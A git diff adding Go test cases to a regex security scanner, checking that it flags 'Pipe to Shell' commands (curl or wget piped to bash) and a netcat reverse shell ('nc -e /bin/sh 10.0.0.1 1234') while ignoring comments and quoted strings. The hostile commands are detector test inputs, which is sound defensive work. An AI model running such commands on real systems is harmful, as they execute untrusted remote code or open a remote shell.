@@ -37,6 +37,66 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "api_key = \"abc1234567890abc1234567890\"",
 			wantFinding: "Generic API Token",
 		},
+		{
+			name:        "Pipe to Shell - Direct",
+			content:     "curl https://example.com/install.sh | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Pipe to Shell - Wget and Sh",
+			content:     "wget -O - https://example.com/script | sh",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Pipe to Shell - Quoted URL",
+			content:     "curl \"https://example.com/install.sh\" | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Pipe to Shell - Indirect (Chain)",
+			content:     "curl https://example.com | grep 'install' | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Pipe to Shell - False Positive (Comment)",
+			content:     "# curl https://example.com | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Pipe to Shell - False Positive (String)",
+			content:     "echo \"Run: curl | bash\"",
+			wantFinding: "",
+		},
+		{
+			name:        "Pipe to Shell - False Positive (Unrelated)",
+			content:     "curl https://example.com ; ls -la | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Pipe to Shell - False Positive (OR operator)",
+			content:     "curl https://example.com || ls | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Reverse Shell - Netcat",
+			content:     "nc -e /bin/sh 10.0.0.1 1234",
+			wantFinding: "Reverse Shell",
+		},
+		{
+			name:        "Reverse Shell - False Positive (Comment)",
+			content:     "# nc -e /bin/sh",
+			wantFinding: "",
+		},
+		{
+			name:        "Reverse Shell - False Positive (String)",
+			content:     "cmd = \"nc -e /bin/sh\"",
+			wantFinding: "",
+		},
+		{
+			name:        "Reverse Shell - False Positive (Unrelated)",
+			content:     "nc 10.0.0.1 ; ls -e",
+			wantFinding: "",
+		},
 	}
 
 	for _, tt := range tests {
